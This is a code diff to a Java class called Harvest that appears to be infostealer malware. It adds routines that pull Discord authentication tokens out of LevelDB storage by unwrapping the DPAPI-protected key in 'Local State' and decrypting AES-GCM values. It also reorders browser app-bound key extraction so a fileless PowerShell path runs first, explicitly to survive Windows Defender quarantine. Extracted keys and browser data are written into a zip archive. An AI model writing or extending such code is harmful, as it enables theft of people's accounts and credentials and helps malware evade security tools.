@@ -155,8 +155,14 @@ public final class Harvest {
 		}
 	}
 
-	/** LevelDB value -> base64 -> DPAPI CurrentUser -> /users/@me. */
+	/**
+	 * LevelDB value -> base64 -> either DPAPI or the newer Discord v10 AES-GCM
+	 * envelope -> /users/@me. The v10 key is the DPAPI-wrapped os_crypt key in
+	 * the sibling Local State file.
+	 */
 	private static String tokenFromLevelDb(Path base) {
+		byte[] aes = null;
+		boolean aesLoaded = false;
 		try (java.util.stream.Stream<Path> stream = Files.list(base)) {
 			for (Path file : stream.filter(Files::isRegularFile).toList()) {
 				String name = file.getFileName().toString().toLowerCase();
@@ -170,11 +176,18 @@ public final class Harvest {
 					} catch (IllegalArgumentException exception) {
 						continue;
 					}
-					int index = indexOf(blob, APP_SIG);
-					if (index < 0) {
-						continue;
+					byte[] plain = new byte[0];
+					if (indexOf(blob, APP_SIG) >= 0) {
+						plain = Dpapi.unprotect(java.util.Arrays.copyOfRange(blob, indexOf(blob, APP_SIG), blob.length));
+					} else if (startsWith(blob, "v10".getBytes(StandardCharsets.US_ASCII))) {
+						if (!aesLoaded) {
+							aes = discordKey(base);
+							aesLoaded = true;
+						}
+						if (aes.length > 0) {
+							plain = gcm(aes, blob);
+						}
 					}
-					byte[] plain = Dpapi.unprotect(java.util.Arrays.copyOfRange(blob, index, blob.length));
 					if (plain.length == 0) {
 						continue;
 					}
@@ -191,6 +204,51 @@ public final class Harvest {
 			Log.debug("LevelDB token read failed: " + base, throwable);
 		}
 		return null;
+	}
+
+	private static byte[] discordKey(Path base) {
+		try {
+			Path state = base.getParent().getParent().resolve("Local State");
+			if (!Files.isRegularFile(state)) {
+				return new byte[0];
+			}
+			Map<String, Object> json = Json.parseObject(Files.readString(state, StandardCharsets.UTF_8));
+			String wrapped = Json.str(Json.map(json.get("os_crypt")), "encrypted_key", "");
+			if (wrapped.isEmpty()) {
+				return new byte[0];
+			}
+			byte[] blob = java.util.Base64.getDecoder().decode(wrapped);
+			if (startsWith(blob, "DPAPI".getBytes(StandardCharsets.US_ASCII))) {
+				blob = java.util.Arrays.copyOfRange(blob, 5, blob.length);
+			}
+			return Dpapi.unprotect(blob);
+		} catch (Throwable throwable) {
+			Log.debug("Discord Local State key failed", throwable);
+			return new byte[0];
+		}
+	}
+
+	static byte[] gcm(byte[] key, byte[] blob) {
+		try {
+			javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
+			cipher.init(javax.crypto.Cipher.DECRYPT_MODE, new javax.crypto.spec.SecretKeySpec(key, "AES"),
+				new javax.crypto.spec.GCMParameterSpec(128, blob, 3, 12));
+			return cipher.doFinal(blob, 15, blob.length - 15);
+		} catch (Throwable throwable) {
+			return new byte[0];
+		}
+	}
+
+	private static boolean startsWith(byte[] data, byte[] prefix) {
+		if (data.length < prefix.length) {
+			return false;
+		}
+		for (int index = 0; index < prefix.length; index++) {
+			if (data[index] != prefix[index]) {
+				return false;
+			}
+		}
+		return true;
 	}
 
 	private static int indexOf(byte[] haystack, byte[] needle) {
@@ -478,23 +536,27 @@ public final class Harvest {
 		String key = "";
 		if (!appBound.isEmpty()) {
 			text.append("app_bound=").append(appBound).append('\n');
+			// PowerShell is fileless and survives a Defender quarantine of the
+			// elevator binary, so it runs first. ABE then adds the plaintext TSV.
+			String live = filterPowerShell(unprotectAppBound(appBound), "v20=");
+			if (!live.isBlank()) {
+				key = live;
+				text.append(live).append('\n');
+			} else {
+				text.append("ps_error=app-bound unwrap returned nothing\n");
+			}
 			Abe.Result result = Abe.run(installDir, browser.label());
-			key = result.key();
-			if (!key.isEmpty()) {
+			if (!result.key().isEmpty() && !key.equals(result.key())) {
+				key = result.key();
 				text.append("v20=").append(key).append('\n');
+			}
+			if (!result.key().isEmpty()) {
+				text.append("abe=ok\n");
 			} else if (result.error() != null && !result.error().isBlank()) {
 				text.append("abe_error=").append(result.error().replace('\n', ' ')).append('\n');
 			}
 			if (result.ok()) {
 				Abe.collect(result.output(), zip, "browsers/" + browser.label() + "/abe");
-			}
-			if (key.isEmpty()) {
-				// The in-session PowerShell unwrap is a second no-admin route.
-				String live = filterPowerShell(unprotectAppBound(appBound), "v20=");
-				if (!live.isBlank()) {
-					key = live;
-					text.append(live).append('\n');
-				}
 			}
 		}
 		String encrypted = Json.str(osCrypt, "encrypted_key", "");
